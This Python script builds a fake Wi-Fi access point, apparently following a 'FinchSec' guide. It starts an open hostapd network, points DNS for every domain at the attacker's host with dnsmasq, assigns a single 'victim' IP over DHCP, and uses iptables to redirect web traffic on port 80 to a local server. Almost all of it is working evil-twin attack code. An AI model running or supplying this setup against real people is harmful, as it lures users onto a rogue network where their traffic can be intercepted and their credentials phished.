#!/usr/bin/env python3
"""
Fake AP Setup Script - Based on FinchSec Guide
This creates a functional access point with DHCP and DNS
"""

import subprocess
import sys
import os
import time
import signal
import argparse
from pathlib import Path

# Global variables
hostapd_process = None
dnsmasq_process = None
cleanup_done = False

def run_command(cmd, shell=False, check=True):
    """Run a command and return result"""
    try:
        if shell:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
        else:
            result = subprocess.run(cmd, capture_output=True, text=True, check=check)
        return result
    except subprocess.CalledProcessError as e:
        if check:
            print(f"[ERROR] Command failed: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
            print(f"[ERROR] {e.stderr}")
        return e

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n[!] Shutting down fake AP...")
    cleanup()
    sys.exit(0)

def cleanup():
    """Clean up everything"""
    global hostapd_process, dnsmasq_process, cleanup_done
    
    if cleanup_done:
        return
    cleanup_done = True
    
    print("\n[*] Cleaning up...")
    
    # Kill processes
    if hostapd_process:
        hostapd_process.terminate()
        try:
            hostapd_process.wait(timeout=2)
        except:
            hostapd_process.kill()
    
    if dnsmasq_process:
        dnsmasq_process.terminate()
        try:
            dnsmasq_process.wait(timeout=2)
        except:
            dnsmasq_process.kill()
    
    # Kill any remaining processes
    run_command(['sudo', 'killall', 'hostapd'], check=False)
    run_command(['sudo', 'killall', 'dnsmasq'], check=False)
    
    # Clear firewall rules
    print("[*] Removing firewall rules...")
    run_command(['sudo', 'nft', 'delete', 'table', 'nat'], check=False)
    # Or if using iptables:
    run_command(['sudo', 'iptables', '-t', 'nat', '-F'], check=False)
    run_command(['sudo', 'iptables', '-F', 'FORWARD'], check=False)
    
    # Disable IP forwarding
    run_command('echo "0" | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null', shell=True, check=False)
    
    # Clean up interface
    run_command(['sudo', 'ip', 'addr', 'flush', 'dev', 'wlan0'], check=False)
    run_command(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], check=False)
    
    # Restart NetworkManager
    print("[*] Restarting NetworkManager...")
    run_command(['sudo', 'systemctl', 'restart', 'NetworkManager'], check=False)
    run_command(['sudo', 'systemctl', 'enable', 'systemd-resolved'], check=False)
    run_command(['sudo', 'systemctl', 'start', 'systemd-resolved'], check=False)
    
    print("[✓] Cleanup complete")

def stop_network_managers():
    """Stop network managers that interfere with AP"""
    print("[*] Stopping network managers...")
    run_command(['sudo', 'systemctl', 'disable', 'systemd-resolved'], check=False)
    run_command(['sudo', 'systemctl', 'stop', 'systemd-resolved'], check=False)
    run_command(['sudo', 'systemctl', 'stop', 'NetworkManager'], check=False)
    run_command(['sudo', 'systemctl', 'stop', 'wpa_supplicant'], check=False)
    run_command(['sudo', 'killall', 'wpa_supplicant'], check=False)
    time.sleep(1)

def setup_ip_forwarding():
    """Enable IP forwarding"""
    print("[*] Enabling IP forwarding...")
    run_command('echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward', shell=True)

def setup_interface(interface, ip_address):
    """Configure the AP interface with static IP"""
    print(f"[*] Configuring {interface} with IP {ip_address}...")
    run_command(['sudo', 'ip', 'link', 'set', interface, 'up'])
    run_command(['sudo', 'ip', 'addr', 'add', f'{ip_address}/24', 'dev', interface])

def setup_firewall_iptables(ap_interface, internet_interface):
    """Setup firewall rules using iptables (fallback)"""
    print("[*] Setting up firewall rules (iptables)...")
    
    commands = [
        ['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', internet_interface, '-j', 'MASQUERADE'],
        ['sudo', 'iptables', '-A', 'FORWARD', '-i', internet_interface, '-o', ap_interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
        ['sudo', 'iptables', '-A', 'FORWARD', '-i', ap_interface, '-o', internet_interface, '-j', 'ACCEPT'],
        ['sudo', 'iptables', '-P', 'FORWARD', 'ACCEPT'],
        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-p", "tcp", "--dport", '80',"-d", '192.168.0.1', "-j" ,"ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", ap_interface, "-j" ,"DROP"],
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", "192.168.0.1:80"]

    ]
    
    for cmd in commands:
        run_command(cmd, check=False)

def create_dnsmasq_config(ap_interface, ip_address, victim_ip_address):
    """Create dnsmasq configuration"""

    
    config = f"""
    no-resolv
    interface={ap_interface}
    server=8.8.8.8
    listen-address={ip_address}
    dhcp-range={victim_ip_address},{victim_ip_address},12h
    dhcp-option=6,{ip_address}
    dhcp-option=3,{ip_address}
    address=/#/{ip_address}\n
    """
    
    config_file = '/tmp/fake_ap_dnsmasq.conf'
    with open(config_file, 'w') as f:
        f.write(config)
    
    return config_file

def create_hostapd_config(interface, ssid, channel):
    """Create hostapd configuration"""
    
    config = f"""
interface={interface}
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
"""
    
    config_file = '/tmp/fake_ap_hostapd.conf'
    with open(config_file, 'w') as f:
        f.write(config)
    
    return config_file

def start_dnsmasq(config_file):
    """Start dnsmasq"""
    global dnsmasq_process
    
    print("[*] Starting dnsmasq...")
    dnsmasq_process = subprocess.Popen(
        ['sudo', 'dnsmasq', '-C', config_file, '-d'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Check if it started
    time.sleep(1)
    if dnsmasq_process.poll() is None:
        print("[✓] dnsmasq started successfully")
        return True
    else:
        stderr = dnsmasq_process.stderr.read().decode()
        print(f"[ERROR] dnsmasq failed to start: {stderr}")
        return False

def start_hostapd(config_file):
    """Start hostapd"""
    global hostapd_process
    
    print("[*] Starting hostapd...")
    hostapd_process = subprocess.Popen(
        ['sudo', 'hostapd', config_file],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Wait for AP to be enabled
    time.sleep(3)
    
    # Check output for success
    if hostapd_process.poll() is None:
        print("[✓] hostapd started successfully")
        return True
    else:
        stderr = hostapd_process.stderr.read().decode()
        print(f"[ERROR] hostapd failed: {stderr}")
        return False

def get_internet_interface():
    """Try to detect the internet interface"""
    # Check default route
    result = run_command(['ip', 'route', 'show', 'default'], check=False)
    if result.returncode == 0:
        for line in result.stdout.split('\n'):
            if 'default' in line:
                parts = line.split()
                for i, part in enumerate(parts):
                    if part == 'dev' and i+1 < len(parts):
                        return parts[i+1]
    
    # Fallback to common interfaces
    for iface in ['enp2s1110', 'enp0s3', 'ens33', 'wlan1']:
        result = run_command(['ip', 'link', 'show', iface], check=False)
        if result.returncode == 0:
            return iface
    
    return 'wlxe84e06afb969'  # Default fallback

def create_fake_ap(ssid, channel, ap_interface, ap_ip_address, victim_ip):
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    print(f"\n{'='*50}")
    print(f"  FAKE AP SETUP")
    print(f"{'='*50}")
    print(f"SSID: {ssid}")
    print(f"Channel: {channel}")
    print(f"AP Interface: {ap_interface}")
    
    # Stop network managers
    stop_network_managers()
    
    # Setup interface
    setup_interface(ap_interface, ap_ip_address)
    
    internet_interface = get_internet_interface()
        
    print(f"Internet Interface: {internet_interface}")
        
        # Enable IP forwarding
    setup_ip_forwarding()
        
        # Setup firewall
    setup_firewall_iptables(ap_interface, internet_interface)
    

    print(f"[*] Ensuring {internet_interface} has connectivity...")
    run_command(['sudo', 'dhclient', internet_interface], check=False)
    
    # Create configs
    dnsmasq_config = create_dnsmasq_config(ap_interface, ap_ip_address, victim_ip)
    hostapd_config = create_hostapd_config(ap_interface, ssid, channel)
    
    # Start services
    if not start_dnsmasq(dnsmasq_config):
        cleanup()
        sys.exit(1)
    
    if not start_hostapd(hostapd_config):
        cleanup()
        sys.exit(1)
    
    print(f"\n{'='*50}")
    print(f"[✓] FAKE AP '{ssid}' IS RUNNING!")
    print(f"{'='*50}")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        # Keep running and show some output
        while True:
            time.sleep(5)
            # Check if processes are still running
            if hostapd_process.poll() is not None:
                print("\n[ERROR] hostapd stopped unexpectedly")
                break
            if dnsmasq_process.poll() is not None:
                print("\n[ERROR] dnsmasq stopped unexpectedly")
                break
    except KeyboardInterrupt:
        pass
    
    cleanup()
